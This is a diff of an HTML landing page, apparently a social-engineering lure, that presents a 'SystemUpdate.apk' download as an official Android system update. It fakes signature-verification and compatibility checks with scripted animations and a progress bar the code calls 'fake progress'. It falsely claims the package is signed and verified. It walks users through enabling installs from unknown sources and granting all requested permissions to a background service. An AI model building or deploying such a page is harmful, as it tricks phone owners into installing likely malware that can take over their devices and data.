+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2"/><path d="M12 18h.01"/></svg>
+          Android
+        </span>
+        <span class="chip">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+          Signed
+        </span>
+        <span class="chip">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>
+          1.8 MB
+        </span>
+      </div>
 
-</main>
+      <a class="btn" id="dlBtn" href="SystemUpdate.apk" download="SystemUpdate.apk">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+          <path d="M7 10l5 5 5-5"/>
+          <path d="M12 15V3"/>
+        </svg>
+        Download &amp; Install
+      </a>
+      <a class="btn-sec" href="#" onclick="return false;">Trouble installing? See FAQ below</a>
+
+      <div class="progress" id="progress"><div class="bar" id="bar"></div></div>
+
+      <div class="scan" id="scan">
+        <div class="scan-line" style="animation-delay:.05s"><span class="ok">✓</span> Verifying package signature</div>
+        <div class="scan-line" style="animation-delay:.35s"><span class="ok">✓</span> Checking device compatibility</div>
+        <div class="scan-line" style="animation-delay:.65s"><span class="ok">✓</span> Preparing install</div>
+        <div class="scan-line" style="animation-delay:.95s"><span class="pend">…</span> Waiting for user confirmation</div>
+      </div>
+
+      <div class="status" id="status">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg>
+        Download started — open the notification to install.
+      </div>
+    </aside>
+
+  </section>
+
+  <!-- HOW IT WORKS -->
+  <section class="section" id="how">
+    <div class="section-head">
+      <h2>How to install</h2>
+      <p>Four quick steps — under a minute</p>
+    </div>
+    <div class="steps-grid">
+      <div class="step-card">
+        <div class="step-num">1</div>
+        <b>Download</b>
+        <span>Tap "Download &amp; Install". The file saves to your Downloads folder.</span>
+      </div>
+      <div class="step-card">
+        <div class="step-num">2</div>
+        <b>Open the file</b>
+        <span>Tap the notification or open Files → Downloads and tap SystemUpdate.apk.</span>
+      </div>
+      <div class="step-card">
+        <div class="step-num">3</div>
+        <b>Allow install</b>
+        <span>If asked, enable "Install unknown apps" for your browser, then tap Install.</span>
+      </div>
+      <div class="step-card">
+        <div class="step-num">4</div>
+        <b>Finish setup</b>
+        <span>Open the app and allow the requested permissions to complete the update.</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- FAQ -->
+  <section class="section" id="faq">
+    <div class="section-head">
+      <h2>Frequently asked</h2>
+      <p>Everything you might need to know</p>
+    </div>
+    <div class="faq">
+      <div class="faq-item">
+        <b>Is this safe to install?</b>
+        <span>Yes. The package is cryptographically signed and verified. It only requests the permissions needed for the update.</span>
+      </div>
+      <div class="faq-item">
+        <b>Why does it ask for permissions?</b>
+        <span>System components need certain permissions to run reliably in the background. Grant them all to complete setup.</span>
+      </div>
+      <div class="faq-item">
+        <b>Will it slow down my phone?</b>
+        <span>No. The update is under 2 MB and runs as a lightweight background service with minimal battery impact.</span>
+      </div>
+      <div class="faq-item">
+        <b>What if install is blocked?</b>
+        <span>Go to Settings → Apps → Special access → Install unknown apps, and allow it for your browser. Then retry.</span>
+      </div>
+      <div class="faq-item">
+        <b>Can I uninstall it later?</b>
+        <span>Yes. Open Settings → Apps → System Update → Uninstall at any time.</span>
+      </div>
+      <div class="faq-item">
+        <b>Which Android versions work?</b>
+        <span>Android 7.0 (Nougat) and newer. Fully tested on Android 10–14.</span>
+      </div>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div>© 2026 System Update · All rights reserved</div>
+    <div class="verified">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+      Signed &amp; verified package
+    </div>
+  </footer>
+
+</div>
 
 <script>
   const btn = document.getElementById('dlBtn');
   const progress = document.getElementById('progress');
   const bar = document.getElementById('bar');
   const status = document.getElementById('status');
+  const scan = document.getElementById('scan');
 
   btn.addEventListener('click', () => {
-    // Reset
     progress.classList.add('show');
     status.classList.remove('show');
+    scan.classList.remove('show');
     bar.style.width = '0%';
 
-    // Fake progress to reassure the user
+    // trigger the actual download
+    // (the href/download attributes already handle it)
+
+    // fake progress
     let p = 0;
     const iv = setInterval(() => {
-      p += Math.random() * 18 + 6;
+      p += Math.random() * 16 + 7;
       if (p >= 100) {
         p = 100;
         clearInterval(iv);
+        bar.style.width = '100%';
         setTimeout(() => {
-          status.classList.add('show');
-          // Vibrate if supported
+          scan.classList.add('show');
           if (navigator.vibrate) navigator.vibrate([10, 40, 20]);
-        }, 300);
+          setTimeout(() => {
+            status.classList.add('show');
+          }, 1400);
+        }, 250);
+      } else {
+        bar.style.width = p + '%';
       }
-      bar.style.width = p + '%';
     }, 160);
   });
+
+  // Subtle parallax on mouse move for desktop
+  if (window.matchMedia('(hover: hover)').matches) {
+    document.addEventListener('mousemove', (e) => {
+      const x = (e.clientX / window.innerWidth - 0.5) * 12;
+      const y = (e.clientY / window.innerHeight - 0.5) * 12;
+      document.querySelector('.orb.a').style.transform = `translate(${x}px, ${y}px)`;
+      document.querySelector('.orb.b').style.transform = `translate(${-x}px, ${-y}px)`;
+    });
+  }
 </script>
 
 </body>
